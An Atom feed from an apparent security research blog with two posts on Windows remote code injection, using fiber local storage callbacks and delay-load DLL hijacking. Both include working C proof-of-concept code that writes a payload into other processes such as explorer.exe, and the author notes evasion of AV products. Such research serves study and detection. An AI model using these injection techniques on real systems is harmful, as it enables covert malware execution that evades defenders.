<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: code injection | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/code-injection/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2019-08-22T10:30:15-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Code Execution via Fiber Local Storage]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/"/>
    <updated>2019-08-12T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</id>
    <content type="html"><![CDATA[<p>While working on another research project (post to be released soon, will
update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
technique that fit my situation perfectly. Instead of tainting the other post
with its description and code, I figured I&rsquo;d release a separate post describing
it here.</p>

<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
process, allocate some memory, and copy our shellcode into it. At this point we
simply need to gain control over execution flow; this is where most of
Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
great example is Windows Notification Facility via user subscription callbacks
(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>

<p>These strategies are also predicated on the process having certain capabilities
(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
not all, do not work across sessions or integrity levels. This is obvious and
expected and frankly quite niche, but in my situation, a requirement.</p>

<h2>Fibers</h2>

<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
application&rdquo;[1]. They are essentially register and stack states that can be
swapped in and out at will, and reflect upon the thread in which they are
executing. A single thread can be running at most a single fiber at a time, but
fibers can be hot swapped during execution and their quantum user controlled.</p>

<p>Fibers can also create and use fiber data. A pointer to this is stored in
<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>

<p>```
void TestFiber()
{</p>

<pre><code>PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
PVOID lpFirstFiber = NULL;
memset(lpFiberData, 0x41, 0x10);

lpFirstFiber = ConvertThreadToFiber(lpFiberData);
DebugBreak();
</code></pre>

<p>}</p>

<p>int main()
{</p>

<pre><code>DWORD tid = 0;
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &amp;tid);
WaitForSingleObject(hThread, INFINITE);
return 0;
</code></pre>

<p>}
```</p>

<p>We need to spawn off the test in a new thread, as the main thread will
always have a fiber instantiated and the call will fail. If we
run this in a debugger we can inspect the data after the break:</p>

<p>```
0:000> ~
.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen</p>

<h1>1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen</h1>

<p>0:000> dt <em>NT_TIB 7ffdd000 FiberData
ucrtbased!</em>NT_TIB
   +0x010 FiberData : 0x002ea9c0 Void
0:000> dd poi(0x002ea9c0) l5
002ea998  41414141 41414141 41414141 41414141
002ea9a8  abababab
```</p>

<p>In addition to fiber data, fibers also have access to the fiber local storage
(FLS). For all intents and purposes, this is identical to thread local storage
(TLS)[2]. This allows all thread fibers access to shared data via a global
index. The API for this is pretty simple, and very similar to TLS. In the
following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
previous example as base:</p>

<p><code>
lpFirstFiber = ConvertThreadToFiber(lpFiberData);
dwIdx = FlsAlloc(NULL);
FlsSetValue(dwIdx, lpFiberData);
DebugBreak();
</code></p>

<p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
data is 6:</p>

<p><code>
0:001&gt; ~
   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
0:001&gt; dt _TEB 7ffde000 FlsData
ntdll!_TEB
   +0xfb4 FlsData : 0x0049a008 Void
0:001&gt; dd poi(0x0049a008+(4*8))
0049a998  41414141 41414141 41414141 41414141
0049a9a8  abababab
</code></p>

<p>Note that the offset is always the index + 2.</p>

<h2>Abusing FLS Callbacks to Obtain Execution Control</h2>

<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>

<p><code>
An application-defined function. If the FLS slot is in use, FlsCallback is
called on fiber deletion, thread exit, and when an FLS index is freed. Specify
this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
type defines a pointer to this callback function.
</code></p>

<p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>

<p><code>
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
</code></p>

<p>And fetching it (assuming again an index of 6):</p>

<p><code>
0:001&gt; dt _PEB 7ffd8000 FlsCallback
ucrtbased!_PEB
   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
002d5228  41414141
</code></p>

<p>What happens when we let this run to process exit?</p>

<p><code>
0:001&gt; g
(10a8.1328): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
</code></p>

<p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber
deletion, thread exit, and when an FLS index is freed</code>. This means that worst
case our code executes once the process exits and best case following a
threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
thread for each process will have a fiber instantiated already; it&rsquo;s quite
possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
callbacks are at the process level.</p>

<p>Another salient point here is the first parameter to the callback function.
This parameter is the value of whatever was in the indexed slot and is also
stashed in ECX/RCX before invoking the callback:</p>

<p><code>
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
FlsSetValue(dwIdx, (PVOID)0x42424242);
DebugBreak();
</code></p>

<p>Which, when executed:</p>

<p><code>
(aa8.169c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
</code></p>

<p>Under specific circumstances, this can be quite useful.</p>

<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>

<p>```</p>

<h1>ifdef _WIN64</h1>

<h1>define FlsCallbackOffset 0x320</h1>

<h1>else</h1>

<h1>define FlsCallbackOffset 0x20c</h1>

<h1>endif</h1>

<p>void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess)
{</p>

<pre><code>_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
                                                        "NtQueryInformationProcess");
const char *payload = "\xcc\xcc\xcc\xcc";
PROCESS_BASIC_INFORMATION pbi;
SIZE_T sCallback = 0, sRetLen = 0;
LPVOID lpBuf = NULL;

//
// allocate memory and write in our payload as one would normally do
//

lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);

// now we need to fetch the remote process PEB
NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &amp;pbi,
                          sizeof(PROCESS_BASIC_INFORMATION), NULL);

// read the FlsCallback address out of it
ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
                      (LPVOID)&amp;sCallback, sizeof(SIZE_T), &amp;sRetLen);
sCallback += 2 * sizeof(SIZE_T);

// we're targeting the _freefls call, so overwrite that with our payload
// address 
WriteProcessMemory(hProcess, (LPVOID)sCallback, &amp;dwNewAddr, sizeof(SIZE_T), &amp;sRetLen);
</code></pre>

<p>}
```</p>

<p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
process exit, the callback is executed and we gain control over execution flow.
Pretty useful in the end; more on this soon&hellip;</p>

<h2>References</h2>

<p>[0] <a href="http://www.hexacorn.com">http://www.hexacorn.com</a> <br/>
[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</a> <br/>
[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a> <br/>
[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
    <link href="http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll/"/>
    <updated>2017-09-19T14:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2017/09/19/abusing-delay-load-dll</id>
    <content type="html"><![CDATA[<p>I always tell myself that I&rsquo;ll try posting more frequently on my blog, and yet
here I am, two years later.  Perhaps this post will provide the necessary
motiviation to conduct more public research.  I do love it.</p>

<p>This post details a novel remote code injection technique I discovered while
playing around with delay loading DLLs.  It allows for the injection of
arbitrary code into arbitrary remote, running processes, provided that they
implement the abused functionality.  To make it abundantly clear, this is not
an exploit, it&rsquo;s simply another strategy for migrating into other processes.</p>

<p>Modern code injection techniques typically rely on a variation of two different
win32 API calls: CreateRemoteThread and NtQueueApc.  Endgame recently put out a
great article[0] detailing ten various methods of process injection.  While not
all of them allow for injection into remote processes, particularly those
already running, it does detail the most common, public variations.  This
strategy is more akin to inline hooking, though we&rsquo;re not touching the IAT
and we don&rsquo;t require our code to already be in the process.  There are no calls
to NtQueueApc or CreateRemoteThread, and no need for thread or process
suspension.  There are some limitations, as with anything, which I&rsquo;ll detail
below.</p>

<h2>Delay Load DLL</h2>

<p>Delay loading is a linker strategy that allows for the lazy loading of DLLs.
Executables commonly load all necessary dynamically linked libraries at runtime
and perform the IAT fix-ups then.  Delay loading, however, allows for
these libraries to be lazy loaded at call time, supported by a pseudo IAT
that&rsquo;s fixed-up on first call.  This process can be better illuminated by the
following, decades old figure below:</p>

<p><img src="/images/posts/2017/delay.gif"></p>

<p>This image comes from a great Microsoft article released in 1998 [1] that
describes the strategy quite well, but I&rsquo;ll attempt to distill it here.</p>

<p>Portable executables contain a data directory named
<code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code>, which you can see using <code>dumpbin /imports</code>
or using windbg.  The structure of this entry is described in delayhlp.cpp,
included with the WinSDK:</p>

<p>```
struct InternalImgDelayDescr {</p>

<pre><code>DWORD           grAttrs;        // attributes
LPCSTR          szName;         // pointer to dll name
HMODULE *       phmod;          // address of module handle
PImgThunkData   pIAT;           // address of the IAT
PCImgThunkData  pINT;           // address of the INT
PCImgThunkData  pBoundIAT;      // address of the optional bound IAT
PCImgThunkData  pUnloadIAT;     // address of optional copy of original IAT
DWORD           dwTimeStamp;    // 0 if not bound,
                                // O.W. date/time stamp of DLL bound to (Old BIND)
};
</code></pre>

<p>```</p>

<p>The table itself contains RVAs, not pointers.  We can find the delay directory
offset by parsing the file header:</p>

<p>```
0:022> lm m explorer
start    end        module name
00690000 00969000   explorer   (pdb symbols)        <br/>
0:022> !dh 00690000 -f</p>

<p>File Type: EXECUTABLE IMAGE
FILE HEADER VALUES</p>

<p>[&hellip;]</p>

<p>   68A80 [      40] address [size] of Load Configuration Directory</p>

<pre><code>   0 [       0] address [size] of Bound Import Directory
1000 [     D98] address [size] of Import Address Table Directory
</code></pre>

<p>   AC670 [     140] address [size] of Delay Import Directory</p>

<pre><code>   0 [       0] address [size] of COR20 Header Directory
   0 [       0] address [size] of Reserved Directory
</code></pre>

<p>```</p>

<p>The first entry and it&rsquo;s delay linked DLL can be seen in the following:</p>

<p><code>
0:022&gt; dd 00690000+ac670 l8
0073c670  00000001 000ac7b0 000b24d8 000b1000
0073c680  000ac8cc 00000000 00000000 00000000
0:022&gt; da 00690000+000ac7b0
0073c7b0  "WINMM.dll"
</code></p>

<p>This means that WINMM is dynamically linked to explorer.exe, but delay loaded,
and will not be loaded into the process until the imported function is invoked.
Once loaded, a helper function fixes up the psuedo IAT by using GetProcAddress
to locate the desired function and patching the table at runtime.</p>

<p>The pseudo IAT referenced is separate from the standard PE IAT; this IAT
is specifically for the delay load functions, and is referenced from the delay
descriptor.  So for example, in WINMM.dll&rsquo;s case, the pseudo IAT for WINMM is
at RVA 000b1000.  The second delay descriptor entry would have a separate RVA
for its pseudo IAT, and so on and so forth.</p>

<p>Using WINMM as our delay example, explorer imports one function from it, <code>PlaySoundW</code>.
In my particular running instance, it has not been invoked, so the pseudo IAT
has not been fixed up yet.  We can see this by dumping it&rsquo;s pseudo IAT entry:</p>

<p><code>
0:022&gt; dps 00690000+000b1000 l2
00741000  006dd0ac explorer!_imp_load__PlaySoundW
00741004  00000000
</code></p>

<p>Each DLL entry is null terminated.  The above pointer shows us that the existing
entry is merely a springboard thunk within the Explorer process.  This takes
us here:</p>

<p><code>
0:022&gt; u explorer!_imp_load__PlaySoundW
explorer!_imp_load__PlaySoundW:
006dd0ac b800107400      mov     eax,offset explorer!_imp__PlaySoundW (00741000)
006dd0b1 eb00            jmp     explorer!_tailMerge_WINMM_dll (006dd0b3)
explorer!_tailMerge_WINMM_dll:
006dd0b3 51              push    ecx
006dd0b4 52              push    edx
006dd0b5 50              push    eax
006dd0b6 6870c67300      push    offset explorer!_DELAY_IMPORT_DESCRIPTOR_WINMM_dll (0073c670)
006dd0bb e8296cfdff      call    explorer!__delayLoadHelper2 (006b3ce9)
</code></p>

<p>The tailMerge function is a linker-generated stub that&rsquo;s compiled in per-DLL,
not per function.  The <code>__delayLoadHelper2</code> function is the magic that
handles the loading and patching of the pseudo IAT.  Documented in delayhlp.cpp,
this function handles calling LoadLibrary/GetProcAddress and patching the
pseudo IAT.  As a demonstration of how this looks, I compiled a binary that
delay links dnslib.  Here&rsquo;s the process of resolution of
DnsAcquireContextHandle:</p>

<p><code>
0:000&gt; dps 00060000+0001839c l2
0007839c  000618bd DelayTest!_imp_load_DnsAcquireContextHandle_W
000783a0  00000000
0:000&gt; bp DelayTest!__delayLoadHelper2
0:000&gt; g
ModLoad: 753e0000 7542c000   C:\Windows\system32\apphelp.dll
Breakpoint 0 hit
[...]
0:000&gt; dd esp+4 l1
0024f9f4  00075ffc
0:000&gt; dd 00075ffc l4
00075ffc  00000001 00010fb0 000183c8 0001839c
0:000&gt; da 00060000+00010fb0
00070fb0  "DNSAPI.dll"
0:000&gt; pt
0:000&gt; dps 00060000+0001839c l2
0007839c  74dfd0fc DNSAPI!DnsAcquireContextHandle_W
000783a0  00000000
</code></p>

<p>Now the pseudo IAT entry has been patched up and the correct function is
invoked on subsequent calls.  This has the additional side effect of leaving
the pseudo IAT as both executable and writable:</p>

<p><code>
0:011&gt; !vprot 00060000+0001839c
BaseAddress:       00371000
AllocationBase:    00060000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
</code></p>

<p>At this point, the DLL has been loaded into the process and the pseudo IAT
patched up.  In another additional twist, not all functions are resolved on
load, only the one that is invoked.  This leaves certain entries in the
pseudo IAT in a mixed state:</p>

<p><code>
00741044  00726afa explorer!_imp_load__UnInitProcessPriv
00741048  7467f845 DUI70!InitThread
0074104c  00726b0f explorer!_imp_load__UnInitThread
00741050  74670728 DUI70!InitProcessPriv
0:022&gt; lm m DUI70
start    end        module name
74630000 746e2000   DUI70      (pdb symbols)
</code></p>

<p>In the above, two of the four functions are resolved and the DUI70.dll library
is loaded into the process.  In each entry of the delay load descriptor, the
structure referenced above maintains an RVA to the HMODULE.  If the module
isn&rsquo;t loaded, it will be null.  So when a delayed function is invoked that&rsquo;s
already loaded, the delay helper function will check it&rsquo;s entry to determine if
a handle to it can be used:</p>

<p>```
HMODULE hmod = *idd.phmod;</p>

<pre><code>if (hmod == 0) {
    if (__pfnDliNotifyHook2) {
        hmod = HMODULE(((*__pfnDliNotifyHook2)(dliNotePreLoadLibrary, &amp;dli)));
        }
    if (hmod == 0) {
        hmod = ::LoadLibraryEx(dli.szDll, NULL, 0);
        }
</code></pre>

<p>```</p>

<p>The <code>idd</code> structure is just an instance of the InternalImgDelayDescr described
above and passed into the <code>__delayLoadHelper2</code> function from the linker
tailMerge stub.  So if the module is already loaded, as referenced from delay
entry, then it uses that handle instead.  It does NOT attempt to LoadLibrary
irregardless of this value; this can be used to our advantage.</p>

<p>Another note here is that the delay loader supports notification hooks.  There
are six states we can hook into: processing start, pre load library, fail
load library, pre GetProcAddress, fail GetProcAddress, and end processing.  You
can see how the hooks are used in the above code sample.</p>

<p>Finally, in addition to delay loading, the portable executable also supports
delay library unloading.  It works pretty much how you&rsquo;d expect it, so we
won&rsquo;t be touching on it here.</p>

<h2>Limitations</h2>

<p>Before detailing how we might abuse this (though it should be fairly obvious),
it&rsquo;s important to note the limitations of this technique.  It is not completely
portable, and using pure delay load functionality it cannot be made to be so.</p>

<p>The glaring limitation is that the technique requires the remote process to be
delay linked.  A brief crawl of some local processes on my host shows many
Microsoft applications are: dwm, explorer, cmd.  Many non-Microsoft
applications are as well, including Chrome.  It is additionally a well
supported function of the portable executable, and exists today on modern
systems.</p>

<p>Another limitation is that, because at it&rsquo;s core it relies on LoadLibrary,
there must exist a DLL on disk.  There is no way to LoadLibrary from memory
(unless you use one of the countless techniques to do that, but none of which
use LoadLibrary&hellip;).</p>

<p>In addition to implementing the delay load, the remote process must implement
functionality that can be triggered.  Instead of doing a CreateRemoteThread,
SendNotifyMessage, or ResumeThread, we rely on the fetch to the pseudo IAT, and
thus we must be able to trigger the remote process into performing this
action/executing this function.  This is generally pretty easy if you&rsquo;re using
the suspended process/new process strategy, but may not be trivial on running
applications.</p>

<p>Finally, any process that does not allow unsigned libraries to be loaded will
block this technique.  This is controlled by ProcessSignaturePolicy and can be
set with SetProcessMitigationPolicy[2]; it is unclear how many apps are using
this at the moment, but Microsoft Edge was one of the first big products to be
employing this policy.  This technique is also impacted by the
ProcessImageLoadPolicy policy, which can be set to restrict loading of images
from a UNC share.</p>

<h2>Abuse</h2>

<p>When discussing an ability to inject code into a process, there are three
separate cases an attacker may consider, and some additional edge situations
within remote processes.  Local process injection is simply the execution of
shellcode/arbitrary code within the current process.  Suspended process is the
act of spawning a new, suspended process from an existing, controlled one and
injecting code into it.  This is a fairly common strategy to employ for
migrating code, setting up backup connections, or establishing a known process
state prior to injection.  The final case is the running remote process.</p>

<p>The running remote process is an interesting case with several caveats that
we&rsquo;ll explore below.  I won&rsquo;t detail suspended processes, as it&rsquo;s essentially
the same as a running process, but easier.  It&rsquo;s easier because many
applications actually just load the delay library at runtime, either because
the functionality is environmentally keyed and required then, or because
another loaded DLL is linked against it and requires it.  Refer to the source
code for the project for an implementation of suspended process injection [3].</p>

<h3>Local Process</h3>

<p>The local process is the most simple and arguably the most useless for this
strategy.  If we can inject and execute code in this manner, we might as well
link against the library we want to use.  It serves as a fine introduction to
the topic, though.</p>

<p>The first thing we need to do is delay link the executable against something.
For various reasons I originally chose <code>dnsapi.dll</code>.  You can specify delay
load DLLs via the linker options for Visual Studio.</p>

<p>With that, we need to obtain the RVA for the delay directory.  This can be
accomplished with the following function:</p>

<p>```
IMAGE_DELAYLOAD_DESCRIPTOR<em>
findDelayEntry(char </em>cDllName)
{</p>

<pre><code>PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos-&gt;e_lfanew);
PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + 
        pImgNt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
DWORD dwBaseAddr = (DWORD)GetModuleHandle(NULL);
IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;

// iterate over entries 
for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry-&gt;ImportAddressTableRVA != NULL; entry++){
    char *_cDllName = (char*)(dwBaseAddr + entry-&gt;DllNameRVA);
    if (strcmp(_cDllName, cDllName) == 0){
        pImgResult = entry;
        break;
    }
}

return pImgResult;
</code></pre>

<p>}
```</p>

<p>Should be pretty clear what we&rsquo;re doing here.  Once we&rsquo;ve got the correct table
entry, we need to mark the entry&rsquo;s DllName as writable, overwrite it with our
custom DLL name, and restore the protection mask:</p>

<p><code>
IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
DWORD dwEntryAddr = (DWORD)((DWORD)GetModuleHandle(NULL) + pImgDelayEntry-&gt;DllNameRVA);
VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), PAGE_READWRITE, &amp;dwOldProtect);
WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &amp;wroteBytes);
VirtualProtect((LPVOID)dwEntryAddr, sizeof(DWORD), dwOldProtect, &amp;dwOldProtect);
</code></p>

<p>Now all that&rsquo;s left to do is trigger the targeted function.  Once triggered,
the delay helper function will snag the DllName from the table entry and load
the DLL via LoadLibrary.</p>

<h3>Remote Process</h3>

<p>The most interesting of cases is the running remote process.  For demonstration
here, we&rsquo;ll be targeting explorer.exe, as we can almost always rely on it to be
running on a workstation under the current user.</p>

<p>With an open handle to the explorer process, we must perform the same
searching tasks as we did for the local process, but this time in a remote
process.  This is a little more cumbersome, but the code can be found in the
project repository for reference[3].  We simply grab the remote PEB, parse the
image and it&rsquo;s directories, and locate the appropriate delay entry we&rsquo;re
targeting.</p>

<p>This part is likely to prove the most unfriendly when attempting to port this
to another process; what functionality are we targeting?  What function or
delay load entry is generally unused, but triggerable from the current session?
With explorer there are several options; it&rsquo;s delay linked against 9 different
DLLs, each averaging 2-3 imported functions.  Thankfully one of the first
functions I looked at was pretty straightforward: <code>CM_Request_Eject_PC</code>.  This
function, exported by <code>CFGMGR32.dll</code>, requests that the system be ejected from
the local docking station[4].  We can therefore assume that it&rsquo;s likely to be
available and not fixed on workstations, and potentially unfixed on laptops,
should the user never explicitly request the system to be ejected.</p>

<p>When we request for the workstation to be ejected from the docking station, the
function sends a PNP request.  We use the IShellDispatch object to execute
this, which is accessed via Shell, handled by, you guessed it, explorer.</p>

<p>The code for this is pretty simple:</p>

<p>```
HRESULT hResult = S_FALSE;
IShellDispatch *pIShellDispatch = NULL;</p>

<p>CoInitialize(NULL);</p>

<p>hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER,</p>

<pre><code>                       IID_IShellDispatch, (void**)&amp;pIShellDispatch);
</code></pre>

<p>if (SUCCEEDED(hResult))
{</p>

<pre><code>pIShellDispatch-&gt;EjectPC();
pIShellDispatch-&gt;Release();
</code></pre>

<p>}</p>

<p>CoUninitialize();
```</p>

<p>Our DLL only needs to export <code>CM_Request_Eject_PC</code> for us to not crash the
process; we can either pass on the request to the real DLL, or simply ignore
it.  This leads us to stable and reliable remote code injection.</p>

<h3>Remote Process &ndash; All Fixed</h3>

<p>One interesting edge case is a remote process that you want to inject into via
delay loading, but all imported functions have been resolved in the pseudo IAT.
This is a little more complicated, but all hope is not lost.</p>

<p>Remember when I mentioned earlier that a handle to the delay load library is
maintained in its descriptor?  This is the value that the helper function
checks for to determine if it should reload the module or not; if it&rsquo;s null, it
attempts to load it, if it&rsquo;s not, it uses that handle.  We can abuse this check
by nulling out the module handle, thereby &ldquo;tricking&rdquo; the helper function into
once again loading that descriptor&rsquo;s DLL.</p>

<p>In the discussed case, however, the pseudo IAT is all patched up; no more
trampolines into the delay load helper function.  Helpfully the pseudo IAT is
writable by default, so we can simply patch in the trampoline function
ourselves and have it instantiate the descriptor all over again.  In short,
this worst-case strategy requires three separate WriteProcessMemory calls: one
to null out the module handle, one to overwrite the pseudo IAT entry, and one
to overwrite the loaded DLL name.</p>

<h3>Conclusions</h3>

<p>I should make mention that I tested this strategy across several next gen
AV/HIPS appliances, which will go unnamed here, and none where able to detect
the cross process injection strategy.  It would seem overall to be an
interesting challenge at detection; in remote processes, the strategy uses the
following chain of calls:</p>

<p>```
OpenProcess(..);</p>

<p>ReadRemoteProcess(..); // read image
ReadRemoteProcess(..); // read delay table
ReadRemoteProcess(..); // read delay entry 1&hellip;n</p>

<p>VirtualProtectEx(..);
WriteRemoteProcess(..);
```</p>

<p>That&rsquo;s it.  The trigger functionality would be dynamic among each process, and
the loaded library would be loaded via supported and well-known Windows
facilities.  I checked out a few other core Windows applications, and they all
have pretty straightforward trigger strategies.</p>

<p>The referenced project[3] includes both x86 and x64 support, and has been
tested across Windows 7, 8.1, and 10.  It includes three functions of interest:
inject_local, inject_suspended, and inject_explorer.  It expects to find
the DLL at <code>C:\Windows\Temp\TestDLL.dll</code>, but this can obviously be changed.
Note that it isn&rsquo;t production quality; beware, here be dragons.</p>

<p><em>Special thanks to Stephen Breen for reviewing this post</em></p>

<h2>References</h2>

<p>[0]
<a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a> <br/>
[1] <a href="https://www.microsoft.com/msj/1298/hood/hood1298.aspx">https://www.microsoft.com/msj/1298/hood/hood1298.aspx</a> <br/>
[2]
<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088">https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088</a>(v=vs.85).aspx <br/>
[3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
[4]
<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
]]></content>
  </entry>
  
</feed>
